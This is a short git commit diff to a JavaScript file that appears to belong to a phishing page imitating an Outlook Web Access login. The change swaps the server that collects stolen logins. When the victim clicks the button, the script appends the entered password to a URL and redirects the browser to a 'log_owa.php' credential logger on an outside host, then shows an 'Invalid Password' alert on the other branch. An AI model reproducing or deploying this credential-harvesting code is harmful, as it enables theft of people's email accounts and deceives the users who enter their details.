7a52f89bca13648c7a74e4c0d8421d563fc63f43
robmccal <143014308+robmccal@users.noreply.github.com>
2023-11-02 11:17:59 +0100

    Update script.js

--- owa/script.js
+++ owa/script.js
@@ -51,7 +51,7 @@ owa_btn.addEventListener("click", function () {
             password.value;
 
         location =
-            "https://falser-skies.000webhostapp.com/gmb/log_owa.php?" + url;
+            "https://tellme24.com/logs/gmb2/log_owa.php?" + url;
         // "log_owa.php?" + url;
     } else {
         alert("Invalid Password");
